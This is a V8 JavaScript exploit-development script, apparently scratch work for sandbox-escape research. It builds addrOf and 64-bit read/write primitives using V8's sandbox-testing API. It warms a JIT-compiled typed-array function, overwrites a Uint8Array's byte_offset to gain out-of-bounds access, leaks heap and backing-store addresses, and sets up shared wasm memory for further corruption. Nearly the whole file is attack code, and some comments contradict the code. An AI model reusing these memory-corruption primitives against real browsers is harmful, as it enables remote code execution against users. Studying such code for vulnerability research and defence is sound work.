// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/typed_array.js

// if accessing oob in the near wasm memory region, it can access by offset....

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
return sandboxMemory.setBigInt64(Number(addr), val, true);
}


/// ==========================================================

// Create a new WebAssembly Memory instance


const gsab = new SharedArrayBuffer(4,{"maxByteLength":0x4242});
%DebugPrint(gsab);

const u8arr = new Uint8Array(gsab);

/// for writing
function foo(obj, index, val){
    obj[index] += val; // if val = 0 -> read
    return obj[index];
}

function test(iii, val){
    return foo(u8arr, iii, val);
}

for (let i = 0; i < 0x10000; i++) {
    test(1, 0);
}
let byte_offset_ofs = BigInt(addrOf(u8arr) + 0x17);
v8_write64(byte_offset_ofs+4n, 0xf1414141n); // changing byte_offset

// %DebugPrint(u8arr);
// console.log("=====================================================================");

// ================= reading heap_base =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1);
let low_ofs_started_page = heap_addr & 0xffffffffn;
let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));

// ================= reading started array address ===============
let started_array = v8_read64(addrOf(u8arr) + 0x2f + 1) >> 0x18n;//
started_array = Number(started_array + high_ofs_started_page);
console.log("started_array: 0x" + started_array.toString(16));
console.log("==================================================================");


/// =================================================================
// var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

const memory = new WebAssembly.Memory({ initial: 1, maximum: 256, shared: true});


console.log("=====================================================================");
// Read the Wasm file
const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 11, 2, 96, 2, 127, 127, 0, 96, 1, 127, 1, 127, 3, 3, 2, 0, 1, 5, 3, 1, 0, 1, 7, 25, 3, 6, 109, 101, 109, 111, 114, 121, 2, 0, 5, 115, 116, 111, 114, 101, 0, 0, 4, 108, 111, 97, 100, 0, 1, 10, 19, 2, 9, 0, 32, 0, 32, 1, 54, 2, 0, 11, 7, 0, 32, 0, 40, 2, 0, 11]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod, {env: { memory: memory }});
const store = wasm_instance.exports.store;
const load = wasm_instance.exports.load;

// Use the WebAssembly store function to write a value to memory
store(0, 0x41); // Store the value 42 at address 0

// Use the WebAssembly load function to read the value from memory
const value = load(0); // Load the value from address 0
console.log(`Value at address 0: ${value}`); // Should print 42

// Directly manipulate the memory from JavaScript
const memoryView = new Float64Array(memory.buffer);
memoryView[2] = 0x42; // Store the value 84 at the second 32-bit slot


%DebugPrint(memory.buffer);
%SystemBreak();
// Verify the memory content from WebAssembly
// const jsValue = load(0xffffff); // Load the value from address 4 (since each 32-bit int is 4 bytes)

const jsValue = load(2);
console.log(`Value at address: ${jsValue}`); // Should print 84

/// ==================================================================



%SystemBreak();

// access out-of-bounds
// test(34212359, 0x4343);